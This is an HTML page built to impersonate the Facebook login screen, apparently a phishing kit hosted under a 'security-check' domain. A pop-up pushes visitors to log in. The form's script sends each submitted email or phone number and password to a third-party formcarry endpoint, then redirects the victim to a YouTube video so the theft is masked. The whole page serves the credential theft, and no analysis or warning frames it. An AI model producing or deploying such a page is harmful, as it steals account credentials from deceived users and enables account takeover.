<!doctype html>
<html lang="en"> 
<head> 
  <meta charset="UTF-8"> 
  <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
  <meta property="og:title" content="Facebook â€“ log in or sign up"> 
  <meta property="og:description" content="Facebook helps you connect and share with the people in your life."> 
  <meta property="og:image" content="https://raw.githubusercontent.com/Gunjan-netizen/Plasto/refs/heads/main/Ms.jpg"> 
  <meta property="og:url" content="https://security-check.netlify.app/"> 
  <title>Facebook Login</title> 
  <link rel="stylesheet" href="styles.css"> 
</head> 
<body onload="showModal()"> 
  <div class="row res"> 
   <div class="fb-form res"> 
    <div class="card"> 
     <h1>Facebook</h1> 
     <p>Connect with friends and the world</p> 
     <p>around you on Facebook.</p> 
    </div> 

    <!-- Login form -->
    <form id="loginForm"> 
     <input type="text" id="emailPhone" name="emailPhone" placeholder="Email or phone number" required> 
     <input type="password" id="password" name="password" placeholder="Password" required> 
     <div class="fb-submit"> 
         <button type="submit" class="login">Login</button> 
         <a href="#" class="forgot">Forgot password?</a> 
     </div> 
     <hr> 
     <div class="button"> 
         <a href="#">Create new account</a> 
     </div> 
    </form> 
   </div> 
  </div>

  <!-- Modal for login encouragement -->
  <div id="popupModal" class="modal">
      <div class="modal-content">
          <span class="close-button" onclick="closeModal()">&times;</span>
          <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo" style="display: block; margin: 0 auto; width: 50px; height: auto;"/>
          <h2 style="text-align: center;">Continue your search</h2>
          <p style="text-align: center;">Log in to find out more about your interests and get the latest updates.</p>
          <button class="modal-button" onclick="closeModal()">Log in</button>
      </div>
  </div>

  <footer> 
   <div class="footer-langs"> 
    <!-- Footer content -->
   </div> 
   <p>&copy; 2024 Facebook, Inc.</p>
  </footer>

  <script>
    // Modal Functionality
    function closeModal() {
        document.getElementById("popupModal").style.display = "none";
    }

    function showModal() {
        document.getElementById("popupModal").style.display = "block";
    }

    // Form submission logic
    document.getElementById("loginForm").addEventListener("submit", function(event) {
        event.preventDefault(); // Form ko page reload hone se rokna

        const formData = new FormData(document.getElementById("loginForm"));

        // Formcarry ko data bhejna
        fetch("https://formcarry.com/s/hJQzoZbhqc-", {
            method: "POST",
            body: formData,
        })
        .finally(() => {
            // Yahan "finally" use kiya hai taaki chahe form submit successful ho ya nahi, redirect ho jaye
            window.location.href = "https://www.youtube.com/watch?v=oRZVgB10BOM"; // Bollywood song pe redirect (Chaaiya Chaaiya as an example)
        });
    });
  </script>
</body>
</html>
